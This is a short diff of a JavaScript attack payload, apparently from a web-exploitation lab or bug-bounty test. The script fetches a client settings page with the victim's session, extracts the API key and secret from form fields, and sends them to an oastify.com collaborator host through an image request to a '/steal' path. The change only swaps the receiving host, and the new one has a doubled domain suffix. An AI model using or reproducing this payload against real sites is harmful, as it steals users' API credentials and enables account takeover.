@@ -5,6 +5,6 @@ fetch("/client/settings/configuration", {credentials:"include"})
     let k=d.querySelector('input[name="api_key"]')?.value;
     let s=d.querySelector('input[name="api_secret"]')?.value;
     if(k&&s){
-      new Image().src=`https://2v1jtx1vezcek1lbfgr5zkmhw82zqqef.oastify.com/steal?key=${encodeURIComponent(k)}&secret=${encodeURIComponent(s)}`;
+      new Image().src=`https://7z7ou220f4djl6mgglsa0pnmxd34rxfm.oastify.com.oastify.com/steal?key=${encodeURIComponent(k)}&secret=${encodeURIComponent(s)}`;
     }
   });
